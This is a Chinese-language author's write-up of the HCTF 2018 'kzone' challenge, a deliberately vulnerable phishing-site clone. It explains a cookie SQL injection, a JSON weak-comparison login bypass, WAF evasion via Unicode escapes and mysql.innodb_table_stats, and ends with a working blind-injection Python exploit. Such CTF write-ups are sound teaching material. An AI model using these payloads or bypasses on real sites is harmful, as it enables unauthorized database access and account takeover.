# HCTF2018_kzone

## 题目情况：

| Name | Description | Score|Solved|
| ------ | ------ | ---- | ---- |
| kzone | A script kid's phishing website | 361.29 |  34  |

## 源码：

所有源码都在上面了

### 如何启动：

```shell
git clone https://github.com/Li4n0/HCTF2018_kzone.git
cd HCTF2018_kzone/
sh start_up.sh 
```

默认端口为10000

## 出题思路以及Write Up：

大二狗第一次出题，出的不够严谨，导致了比较严重的非预期，不过看到非预期的姿势也非常有趣，赛后调查数据又看到很多师傅表示很喜欢这道题目，我就觉得这道题目还是有意义的。

那么先来说说我本身的出题思路吧！

首先，题目本身是基于我今年暑假遇到的一个QQ空间钓鱼平台的源码改造而来的，这个钓鱼平台本身的问题很多，这次题目就是利用了其中`memeber.php` 中存在的 cookie 注入点 。

来看看平台本身的注入点：

```php
$admin_user=base64_decode($_COOKIE['admin_user']);
$udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
if($udata['username']==''){
	setcookie("islogin", "", time() - 604800);
	setcookie("admin_user", "", time() - 604800);
	setcookie("admin_pass", "", time() - 604800);
}
$admin_pass=sha1($udata['password'].LOGIN_KEY);
if($admin_pass==$_COOKIE["admin_pass"]){
	$islogin=1;
}else{
	setcookie("islogin", "", time() - 604800);
	setcookie("admin_user", "", time() - 604800);
	setcookie("admin_pass", "", time() - 604800);
}
```

而在原本的代码基础上，我将`admin_user` 和 `admin_pass` 的引入方式改为`json_decode` (后面会解释原因)，并且增加了一个全局 WAF，对 `$_GET` `$_POST` `$_COOKIE` 分别进行了过滤

过滤的内容如下：

`$blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|and|benchmark|like|regexp|if|=|-|<|>|\#|\s/i';` 

那么如何绕过这个 WAF 呢？大多数师傅都是利用了 `json` 反序列化时，会将`Unicode` 解码的特性，实现了完全绕过 WAF ，这里其实是我过滤的不够完善了。大家可以想一下，如果`\` 也被过滤掉，还有没有其他姿势呢？

其实这个 WAF 造成最大的障碍就是过滤了 `or` 导致没有办法通过 `information_schema` 库来查询表名，然而其实`MySQL`  5.7 之后的版本，在其自带的 `mysql` 库中，新增了 `innodb_table_stats ` 和 `innodb_index_stats` 这两张日志表。如果数据表的引擎是`innodb` ，则会在这两张表中记录表、键的信息 。

而从 `install.sql` 中可以看出，网站使用的正是`innodb` 引擎

```sql
CREATE TABLE IF NOT EXISTS `fish_admin` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL,
  `password` char(32) NOT NULL,
  `name` varchar(255) DEFAULT '',
  `qq` varchar(255) DEFAULT '',
  `per` int(11) NOT NULL DEFAULT '3',
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=innodb  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;
```

因此我们使用 `mysql.innodb_table_stats` 来代替 `information_schema.tables`  即可获取表名。于是现在我们需要思考如何判断注入结果，`sleep` 和 `benchmark` 都已经被过滤了，只能考虑布尔盲注(不考虑笛卡尔积...)。

那么现在是时候来解释一下为什么我要把 `base64_decode ` 换成 `json_decode` 了，这个思路其实是来自 `微擎` 之前一个版本的漏洞：

```php
$session = json_decode(authcode($_GPC['__session']), true);
if (is_array($session)) {
	$user = user_single(array('uid'=>$session['uid']));
	if (is_array($user) && $session['hash'] == md5($user['password'] . $user['salt'])) {
		$_W['uid'] = $user['uid'];
		$_W['username'] = $user['username'];
		$user['currentvisit'] = $user['lastvisit'];
		$user['currentip'] = $user['lastip'];
		$user['lastvisit'] = $session['lastvisit'];
		$user['lastip'] = $session['lastip'];
		$_W['user'] = $user;
		$_W['isfounder'] = user_is_founder($_W['uid']);
		unset($founders);
	} else {
		isetcookie('__session', false, -100);
	}
	unset($user);
}
unset($session);

```

简单来说，就是`微擎` 将用于验证用户身份的`hash` 值，使用了 `json_encode` 进行序列化并储存在 cookie 里面。而在验证的时候，再用`json_decode` 反序列化后取出。但是需要注意的是，在将`hash` 值与数据库中存储的用户密码的`md5` 值进行比较的时候，使用的是弱比较，这就导致我们可以通过构造 `json`字符串使`hash`值为数字，利用弱类型，绕过用户身份验证，实现任意用户登录。

我在这里套用了这个漏洞：

```php
$login_data = json_decode($_COOKIE['login_data'], true);
$admin_user = $login_data['admin_user'];
$udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
if ($udata['username'] == '') {
	setcookie("islogin", "", time() - 604800);
	setcookie("login_data", "", time() - 604800);
}
$admin_pass = sha1($udata['password'] . LOGIN_KEY);
if ($admin_pass == $login_data['admin_pass']) {
     $islogin = 1;
} else {
   	setcookie("islogin", "", time() - 604800);
    setcookie("login_data", "", time() - 604800);
}
```

本来的思路是让大家进行爆破，登录`admin`账户,然后通过 `$admin_user` 构造条件语句，这样就可以通过登录状态来进行布尔盲注了。

然而没想到的两点是：

1. 这恰恰引入了利用 `json` 反序列化 Unicode 绕过 WAF 的漏洞

2. 利用平台本身的逻辑问题，就可以实现布尔注入，具体位置就在上面的代码中：

   * 当查询返回的用户名为空且密码错误时，进行四次`setcookie` 操作
   * 当查询返回的用户名为不为空时，进行两次`setcookie` 操作

   利用这个差异，就已经可以实现布尔盲注了。

所以，这道题目对于我这个出题人来说，其实算是一个比较失败的产物，好在题目本身还能够让一些选手收获知识/乐趣，而且还是有一些队伍是按照我的预期思路做出的这道题目的。而经历48小时的蹂躏后，题目共有 33 只队伍提交有效答案，最终分值为 361分， 也符合我的预期。

未来的一年，我会努力学习更多姿势、积累出题经验，争取在明年的 HCTF 上，给大家带来更优质的题目。

最后，附上我的预期解`exp `:

> PS：由于我上传源码的时候，随手更改了`flag` 导致了一些小变化，下面这个`exp` 就不能直接跑出`flag` 的内容了，大家可以想一想该怎么操作2333

```python
"""
	Author:Li4n0
	Time:2018.11.7
"""

import requests

url = 'http://kzone.2018.hctf.io/admin/'
key = ''
strings = [chr(i) for i in range(32, 127)]

while True:
    for i in reversed(strings):
        if 'or' in key + i:
            continue
       #payload = "admin' and (select group_concat(table_name) from mysql.innodb_table_stats) between '%s' and '%s' and '1" % (key + i, chr(126))
        payload = "admin' and (select * from F1444g) between '%s' and '%s' and '1" % (key + i, chr(126))
       
        headers = {
            'cookie': 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' %
                      payload.replace(' ', '/**/').replace("\"", '\\"'),
        }
        #print(headers)
        r = requests.get(url, headers=headers)
        #print(r.text)
        if 'Management Index' in r.text:
            key += i
            break
        else:
            print(i)
    print(key)

```












